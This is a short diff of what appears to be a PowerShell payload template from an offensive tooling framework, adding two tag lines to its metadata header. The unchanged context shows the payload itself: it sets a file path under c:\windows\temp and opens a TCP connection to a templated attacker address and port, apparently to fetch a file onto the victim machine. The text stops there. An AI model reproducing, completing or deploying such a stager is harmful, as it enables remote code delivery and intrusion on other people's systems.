@@ -9,6 +9,8 @@
 #!payStep##format_ps
 #!render_FLAG##True
 #!lang##PowerShell
+#!system_FLAG##[W]
+#!TAGS##[PS]
 
 $localFile = 'c:\windows\temp\{{PSD_fname}}'
 $client = New-Object System.Net.Sockets.TcpClient('{{IP_ADDR}}', {{PSD_port}})
